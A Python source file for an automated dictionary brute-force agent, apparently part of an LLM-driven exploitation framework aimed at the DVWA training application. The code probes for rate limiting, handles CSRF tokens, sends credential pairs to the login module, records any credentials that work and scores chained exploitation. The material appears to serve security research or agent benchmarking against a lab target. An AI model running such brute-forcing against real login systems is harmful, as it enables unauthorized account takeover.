"""Brute Force Dictionary attack agent with real HTTP execution."""

from __future__ import annotations

import logging
import re
import time as time_mod
from collections.abc import Mapping
from math import isfinite
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier, has_captcha_challenge

logger = logging.getLogger(__name__)

AGENT_ID = "bf_dictionary"
MODULE_PATH = "/vulnerabilities/brute/"
_PROBE_OBSERVATION_KEY = "no_rate_limit"
_CREDENTIAL_PREFIX = re.compile(r"^\s*([^:,;\s]+)\s*:\s*([^,;\s]+)")

_RATE_LIMIT_STATUS = 429
_RATE_LIMIT_LATENCY_RATIO = 3.0
_RATE_LIMIT_BODY_MARKERS = (
    "too many requests",
    "rate limit exceeded",
    "rate-limit exceeded",
    "rate limited",
    "request limit exceeded",
    "too many login attempts",
    "too many failed attempts",
    "login attempts exceeded",
    "account temporarily locked",
    "temporarily blocked",
    "slow down",
    "try again later",
)

_SUCCESS_SIGNALS = [
    "welcome to the password protected area",
    "password protected area",
]


def _module_user_token(session: DVWASession) -> str | None:
    """Fetch the brute-force form token without exposing its value."""
    try:
        page = session.get(MODULE_PATH)
        extractor = getattr(session, "_extract_user_token", None)
        token = extractor(page.text) if callable(extractor) else None
        return token if isinstance(token, str) and token else None
    except Exception as exc:
        logger.warning("[%s] Could not fetch module CSRF token: %s", AGENT_ID, exc)
        return None


def _credential_params(username: str, password: str, user_token: str | None) -> dict[str, str]:
    params = {"username": username, "password": password, "Login": "Login"}
    if user_token:
        params["user_token"] = user_token
    return params


def _response_indicates_rate_limit(response: Any) -> bool:
    """Return whether a response contains an explicit throttling signal.

    Response latency is intentionally not used as an absolute threshold. A
    slow DVWA instance (notably at medium security) can take multiple seconds
    for every request without imposing a rate limit. HTTP status, headers, and
    response text are direct server-side signals and are therefore preferred.
    """
    try:
        if int(getattr(response, "status_code", 0)) == _RATE_LIMIT_STATUS:
            return True
    except (TypeError, ValueError):
        pass

    headers = getattr(response, "headers", None)
    if isinstance(headers, Mapping):
        for name, value in headers.items():
            normalized_name = str(name).lower()
            if normalized_name == "retry-after" and str(value).strip():
                return True
            if (
                normalized_name in {"x-ratelimit-remaining", "x-rate-limit-remaining"}
                and str(value).strip() == "0"
            ):
                return True

    body = getattr(response, "text", "")
    if not isinstance(body, str):
        return False
    normalized_body = " ".join(body.lower().split())
    return any(marker in normalized_body for marker in _RATE_LIMIT_BODY_MARKERS)


def _request_elapsed_seconds(response: Any, started_at: float) -> float:
    """Get transport timing when available, otherwise use a monotonic sample."""
    elapsed_ms = getattr(response, "elapsed_ms", None)
    if isinstance(elapsed_ms, (int, float)) and isfinite(float(elapsed_ms)):
        return max(float(elapsed_ms) / 1000.0, 0.0)
    return max(time_mod.monotonic() - started_at, 0.0)


def _latency_indicates_rate_limit(elapsed_seconds: list[float]) -> bool:
    """Detect a relative slowdown after the first probe request.

    This is only a secondary signal for deployments that throttle by delaying
    responses without returning a status/header/body marker. The first probe
    establishes the local baseline; uniformly slow responses consequently do
    not trigger the check.
    """
    if len(elapsed_seconds) < 2:
        return False
    baseline = elapsed_seconds[0]
    if baseline <= 0:
        return False
    return all(
        elapsed >= baseline * _RATE_LIMIT_LATENCY_RATIO
        for elapsed in elapsed_seconds[1:]
    )


def _probe_preconditions(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    *,
    cached_precondition: bool | None = None,
    user_token: str | None = None,
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send rapid requests to detect rate limiting.

    Uses a small dedicated set of rate-test credentials so probe does not
    consume real exploit payloads. Returns actual credential strings in
    tried_payloads (not synthetic keys).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    sent_any = False
    response_elapsed: list[float] = []
    rate_limit_detected = False

    # Use the provided payloads when present so callers control the probe set.
    # Fall back to dedicated rate-test credentials only when no payloads exist.
    rate_test_credentials = list(payloads) or ["rate_test:test", "probe:probe"]
    for cred in rate_test_credentials:
        if cred in already_tried:
            continue
        sent_any = True
        tried.append(cred)
        username, password = _parse_credential(cred)
        request_started = time_mod.monotonic()
        try:
            resp = session.get(
                MODULE_PATH,
                params=_credential_params(username, password, user_token),
            )
            elapsed_seconds = _request_elapsed_seconds(resp, request_started)
            response_elapsed.append(elapsed_seconds)
            response_rate_limited = _response_indicates_rate_limit(resp)
            rate_limit_detected = rate_limit_detected or response_rate_limited
            events.append(probe_event(
                AGENT_ID,
                cred,
                resp.status_code,
                not response_rate_limited,
                elapsed_ms=elapsed_seconds * 1000,
            ))
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, cred, None, False))

    if not sent_any:
        if cached_precondition is not None:
            observations[_PROBE_OBSERVATION_KEY] = bool(cached_precondition)
            return bool(cached_precondition), tried, observations, events
        return True, tried, {}, events  # Assume no rate limit if already probed

    if rate_limit_detected or _latency_indicates_rate_limit(response_elapsed):
        observations[_PROBE_OBSERVATION_KEY] = False
        return False, tried, observations, events

    observations[_PROBE_OBSERVATION_KEY] = True
    return True, tried, observations, events


def _parse_credential(payload: str) -> tuple[str, str]:
    """Parse only the leading credential pair from candidate logic.

    LLM strategy mutations may append pacing/order prose after a valid pair.
    Never send that prose as the password; only the strict credential prefix
    is transport data.
    """
    match = _CREDENTIAL_PREFIX.match(str(payload))
    return (match.group(1), match.group(2)) if match else ("", "")


def _attempt_exploit(
    session: DVWASession, payloads: list[str], already_tried: set[str],
    security_level: str, user_token: str | None = None,
) -> tuple[int, list[str], list[str], list[dict], list[dict[str, str]], bool]:
    """Try credential pairs. Returns (score, tried, confirmed, events, found_credentials)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    found_credentials: list[dict[str, str]] = []
    score = 0
    verifier = Verifier()

    # Level-aware delay
    delay = 0.5 if security_level == "medium" else 0.0

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        username, password = _parse_credential(payload)
        if not username:
            continue

        try:
            resp = session.get(
                MODULE_PATH,
                params=_credential_params(username, password, user_token),
            )
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))

            # Check for CAPTCHA (out of scope)
            if has_captcha_challenge(resp.text):
                return 0, tried, [], events, [], True

            # Full exploit: successful login
            success_result = verifier.contains_any(resp.text, _SUCCESS_SIGNALS)
            if success_result.ok:
                score = max(score, 3)
                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                found_credentials.append({"username": username, "password": password})
                break

        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

        if delay:
            time_mod.sleep(delay)

    return score, tried, confirmed, events, found_credentials, False

def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the dictionary brute-force static method agent.

    Reads validated credential candidates, target/session configuration,
    rate-limit observations, and tried payload memory. The agent probes for a
    missing rate limit, stops on CAPTCHA evidence, attempts credential pairs
    over HTTP, records found credentials, confirms `bf_dictionary_confirmed` on
    successful login, and runs shared chain scoring after confirmation.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for observations, tried payloads, scores,
        found credentials, confirmed vulnerabilities, achieved outcomes, and
        telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
            )
        session.set_security_level(security_level)
        user_token = _module_user_token(session)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        found_credentials: list[dict[str, str]] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
        cached_no_rate_limit = state.get("observations", {}).get(_PROBE_OBSERVATION_KEY)
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session,
            probe_payloads,
            already_tried,
            cached_precondition=cached_no_rate_limit,
            user_token=user_token,
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")

        exploit_score, tried, confirmed, exploit_events, creds, captcha_boundary = _attempt_exploit(
            session,
            all_exploit,
            already_tried | set(all_tried),
            security_level,
            user_token=user_token,
        )
        if captcha_boundary:
            all_tried.extend(tried)
            telemetry_events.extend(exploit_events)
            update = make_update(
                state=state,
                module_name=AGENT_ID,
                score=0,
                tried_payloads=all_tried,
                telemetry_events=telemetry_events,
                next_agent="scorer",
                failure_agents=[AGENT_ID],
                blocked_agents=[AGENT_ID],
                task_result="INCOMPLETE",
                incomplete_reason="SCOPE_BOUNDARY",
            )
            update["observations"] = observations
            return update
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)
        found_credentials.extend(creds)
        if confirmed_vulns:
            achieved_outcomes.append("authenticated_session")

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            found_credentials=found_credentials or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
